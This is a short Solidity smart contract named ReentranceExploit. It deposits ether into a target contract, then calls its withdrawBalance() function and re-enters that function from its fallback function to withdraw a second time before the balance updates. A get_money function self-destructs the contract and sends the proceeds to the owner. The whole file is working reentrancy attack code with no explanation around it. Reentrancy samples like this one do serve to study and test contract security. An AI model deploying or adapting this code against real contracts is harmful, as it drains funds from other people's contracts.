pragma solidity ^0.4.15;

contract ReentranceExploit {
    bool public attackModeIsOn=false; 
    address public vulnerable_contract;
    address public owner;

    function ReentranceExploit() public{
        owner = msg.sender;
    }

    function deposit(address _vulnerable_contract) public payable{
        vulnerable_contract = _vulnerable_contract ;
         
        require(vulnerable_contract.call.value(msg.value)(bytes4(sha3("addToBalance()"))));
    }

    function launch_attack() public{
        attackModeIsOn = true;
         
         
        require(vulnerable_contract.call(bytes4(sha3("withdrawBalance()"))));
    }  


    function () public payable{
         
         
        if (attackModeIsOn){
            attackModeIsOn = false;
                require(vulnerable_contract.call(bytes4(sha3("withdrawBalance()"))));
        }
    }

    function get_money(){
        suicide(owner);
    }

}
